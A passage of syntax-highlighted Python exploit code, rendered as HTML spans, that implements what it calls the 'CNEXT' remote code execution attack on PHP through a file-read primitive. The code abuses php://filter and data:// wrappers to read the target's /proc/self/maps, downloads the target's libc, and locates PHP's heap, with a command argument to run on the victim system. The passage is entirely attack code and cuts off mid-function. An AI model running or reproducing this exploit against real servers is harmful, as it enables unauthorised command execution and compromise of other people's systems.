</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#96b5b4;">__init__</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">url</span><span style="color:#c0c5ce;">: str) -&gt; </span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.url = url
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.session = </span><span style="color:#8fa1b3;">Session</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">: str) -&gt; Response:
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.
</span><span style="color:#65737e;">        &quot;&quot;&quot;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.session.</span><span style="color:#8fa1b3;">post</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.url, </span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">={&quot;</span><span style="color:#a3be8c;">file</span><span style="color:#c0c5ce;">&quot;: path})
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">download</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">: str) -&gt; bytes:
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">&quot;&quot;&quot;Returns the contents of a remote file.
</span><span style="color:#65737e;">        &quot;&quot;&quot;
</span><span style="color:#c0c5ce;">        path = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">php://filter/convert.base64-encode/resource=</span><span style="color:#c0c5ce;">{path}&quot;
</span><span style="color:#c0c5ce;">        response = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(path)
</span><span style="color:#c0c5ce;">        data = response.re.</span><span style="color:#8fa1b3;">search</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">File contents: (.*)</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">flags</span><span style="color:#c0c5ce;">=re.</span><span style="color:#bf616a;">S</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">group</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">base64.</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">(data)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">@</span><span style="color:#bf616a;">entry
</span><span style="color:#c0c5ce;">@</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">url</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">Target URL</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">@</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">command</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">Command to run on the system; limited to 0x140 bytes</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">@</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">sleep</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">Time to sleep to assert that the exploit worked. By default, 1.</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">@</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">heap</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">Address of the main zend_mm_heap structure.</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">@</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">(
</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">pad</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">Number of 0x100 chunks to pad with. If the website makes a lot of heap </span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">operations with this size, increase this. Defaults to 20.</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">@</span><span style="color:#bf616a;">dataclass
</span><span style="color:#b48ead;">class </span><span style="color:#ebcb8b;">Exploit</span><span style="color:#eff1f5;">:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    url: str
</span><span style="color:#c0c5ce;">    command: str
</span><span style="color:#c0c5ce;">    sleep: int = </span><span style="color:#d08770;">1
</span><span style="color:#c0c5ce;">    heap: str = </span><span style="color:#d08770;">None
</span><span style="color:#c0c5ce;">    pad: int = </span><span style="color:#d08770;">20
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">__post_init__</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.remote = </span><span style="color:#8fa1b3;">Remote</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.url)
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.log = </span><span style="color:#8fa1b3;">logger</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">EXPLOIT</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.info = {}
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.heap = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.heap and int(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.heap, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">check_vulnerable</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">) -&gt; </span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various
</span><span style="color:#65737e;">        wrappers and filters that the exploit needs.
</span><span style="color:#65737e;">        &quot;&quot;&quot;
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">safe_download</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">: str) -&gt; bytes:
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">try</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.remote.</span><span style="color:#8fa1b3;">download</span><span style="color:#c0c5ce;">(path)
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">except </span><span style="color:#c0c5ce;">ConnectionError:
</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">failure</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Target not [b]reachable[/] ?</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">            
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">check_token</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">text</span><span style="color:#c0c5ce;">: str, </span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">: str) -&gt; bool:
</span><span style="color:#c0c5ce;">            result = </span><span style="color:#8fa1b3;">safe_download</span><span style="color:#c0c5ce;">(path)
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">text.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">() == result
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        text = tf.random.</span><span style="color:#8fa1b3;">string</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">50</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        base64 = </span><span style="color:#8fa1b3;">b64</span><span style="color:#c0c5ce;">(text, </span><span style="color:#bf616a;">misalign</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">True</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        path = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">data:text/plain;base64,</span><span style="color:#c0c5ce;">{base64}&quot;
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">        result = </span><span style="color:#8fa1b3;">safe_download</span><span style="color:#c0c5ce;">(path)
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">text not in result:
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">msg_failure</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Remote.download did not return the test string</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">--------------------</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Expected test string: </span><span style="color:#c0c5ce;">{text}&quot;)
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Got: </span><span style="color:#c0c5ce;">{result}&quot;)
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">--------------------</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">failure</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">If your code works fine, it means that the [i]data://[/] wrapper does not work</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">msg_info</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">The [i]data://[/] wrapper works</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        text = tf.random.</span><span style="color:#8fa1b3;">string</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">50</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        base64 = </span><span style="color:#8fa1b3;">b64</span><span style="color:#c0c5ce;">(text.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">(), </span><span style="color:#bf616a;">misalign</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">True</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        path = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">php://filter//resource=data:text/plain;base64,</span><span style="color:#c0c5ce;">{base64}&quot;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">not </span><span style="color:#8fa1b3;">check_token</span><span style="color:#c0c5ce;">(text, path):
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">failure</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">The [i]php://filter/[/] wrapper does not work</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">msg_info</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">The [i]php://filter/[/] wrapper works</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        text = tf.random.</span><span style="color:#8fa1b3;">string</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">50</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        base64 = </span><span style="color:#8fa1b3;">b64</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">compress</span><span style="color:#c0c5ce;">(text.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">()), </span><span style="color:#bf616a;">misalign</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">True</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        path = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span style="color:#c0c5ce;">{base64}&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">not </span><span style="color:#8fa1b3;">check_token</span><span style="color:#c0c5ce;">(text, path):
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">failure</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">The [i]zlib[/] extension is not enabled</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">msg_info</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">The [i]zlib[/] extension is enabled</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">msg_success</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Exploit preconditions are satisfied</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">get_file</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">: str) -&gt; bytes:
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">with </span><span style="color:#8fa1b3;">msg_status</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Downloading [i]</span><span style="color:#c0c5ce;">{path}</span><span style="color:#a3be8c;">[/]...</span><span style="color:#c0c5ce;">&quot;):
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.remote.</span><span style="color:#8fa1b3;">download</span><span style="color:#c0c5ce;">(path)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">get_regions</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">) -&gt; list[Region]:
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;
</span><span style="color:#c0c5ce;">        maps = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">get_file</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/self/maps</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">        maps = maps.</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">PATTERN </span><span style="color:#c0c5ce;">= re.</span><span style="color:#8fa1b3;">compile</span><span style="color:#c0c5ce;">(
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">r</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#b48ead;">^</span><span style="color:#a3be8c;">(</span><span style="color:#d08770;">[a-f0-9]</span><span style="color:#c0c5ce;">+</span><span style="color:#a3be8c;">)-(</span><span style="color:#d08770;">[a-f0-9]</span><span style="color:#c0c5ce;">+</span><span style="color:#a3be8c;">)</span><span style="color:#b48ead;">\b</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#b48ead;">r</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#d08770;">.</span><span style="color:#c0c5ce;">*&quot; </span><span style="color:#b48ead;">r</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#d08770;">\s</span><span style="color:#a3be8c;">(</span><span style="color:#d08770;">[-rwx]</span><span style="color:#c0c5ce;">{3}</span><span style="color:#d08770;">[ps]</span><span style="color:#a3be8c;">)</span><span style="color:#d08770;">\s</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#b48ead;">r</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">(</span><span style="color:#d08770;">.</span><span style="color:#c0c5ce;">*</span><span style="color:#a3be8c;">)</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">        )
</span><span style="color:#c0c5ce;">        regions = []
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">region </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">table.</span><span style="color:#8fa1b3;">split</span><span style="color:#c0c5ce;">(maps, </span><span style="color:#bf616a;">strip</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">True</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">match := PATTERN.</span><span style="color:#8fa1b3;">match</span><span style="color:#c0c5ce;">(region):
</span><span style="color:#c0c5ce;">                start = int(match.</span><span style="color:#8fa1b3;">group</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">), </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">                stop = int(match.</span><span style="color:#8fa1b3;">group</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">), </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">                permissions = match.</span><span style="color:#8fa1b3;">group</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">                path = match.</span><span style="color:#8fa1b3;">group</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">/</span><span style="color:#c0c5ce;">&quot; in path or &quot;</span><span style="color:#a3be8c;">[</span><span style="color:#c0c5ce;">&quot; in path:
</span><span style="color:#c0c5ce;">                    path = path.</span><span style="color:#8fa1b3;">rsplit</span><span style="color:#c0c5ce;">(&quot; &quot;, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)[-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">                    path = &quot;&quot;
</span><span style="color:#c0c5ce;">                current = </span><span style="color:#8fa1b3;">Region</span><span style="color:#c0c5ce;">(start, stop, permissions, path)
</span><span style="color:#c0c5ce;">                regions.</span><span style="color:#8fa1b3;">append</span><span style="color:#c0c5ce;">(current)
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">                </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(maps)
</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">failure</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Unable to parse memory mappings</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.log.</span><span style="color:#8fa1b3;">info</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Got </span><span style="color:#c0c5ce;">{</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(regions)}</span><span style="color:#a3be8c;"> memory regions</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">regions
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">get_symbols_and_addresses</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">) -&gt; </span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;
</span><span style="color:#c0c5ce;">        regions = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">get_regions</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">LIBC_FILE </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">/dev/shm/cnext-libc</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># PHP&#39;s heap
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.info[&quot;</span><span style="color:#a3be8c;">heap</span><span style="color:#c0c5ce;">&quot;] = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.heap or </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">find_main_heap</span><span style="color:#c0c5ce;">(regions)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># Libc
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        libc = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">_get_region</span><span style="color:#c0c5ce;">(regions, &quot;</span><span style="color:#a3be8c;">libc-</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">libc.so</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">download_file</span><span style="color:#c0c5ce;">(libc.path, </span><span style="color:#bf616a;">LIBC_FILE</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.info[&quot;</span><span style="color:#a3be8c;">libc</span><span style="color:#c0c5ce;">&quot;] = </span><span style="color:#8fa1b3;">ELF</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">LIBC_FILE</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">checksec</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">False</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.info[&quot;</span><span style="color:#a3be8c;">libc</span><span style="color:#c0c5ce;">&quot;].address = libc.start
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">_get_region</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">regions</span><span style="color:#c0c5ce;">: list[Region], *</span><span style="color:#bf616a;">names</span><span style="color:#c0c5ce;">: str) -&gt; Region:
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">region </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">regions:
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">any</span><span style="color:#c0c5ce;">(name in region.path </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">name </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">names):
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">break
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">failure</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Unable to locate region</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">region
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">download_file</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">remote_path</span><span style="color:#c0c5ce;">: str, </span><span style="color:#bf616a;">local_path</span><span style="color:#c0c5ce;">: str) -&gt; </span><span style="color:#d08770;">None</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;
</span><span style="color:#c0c5ce;">        data = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">get_file</span><span style="color:#c0c5ce;">(remote_path)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">Path</span><span style="color:#c0c5ce;">(local_path).</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(data)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">find_main_heap</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">regions</span><span style="color:#c0c5ce;">: list[Region]) -&gt; Region:
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># Any anonymous RW region with a size superior to the base heap size is a
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># candidate. The heap is at the bottom of the region.
</span><span style="color:#c0c5ce;">        heaps = [
</span><span style="color:#c0c5ce;">            region.stop - </span><span style="color:#bf616a;">HEAP_SIZE </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">0x40
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">region </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">reversed</span><span style="color:#c0c5ce;">(regions)
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">region.permissions == &quot;</span><span style="color:#a3be8c;">rw-p</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">            and region.size &gt;= </span><span style="color:#bf616a;">HEAP_SIZE
</span><span style="color:#c0c5ce;">            and region.stop &amp; (</span><span style="color:#bf616a;">HEAP_SIZE</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0
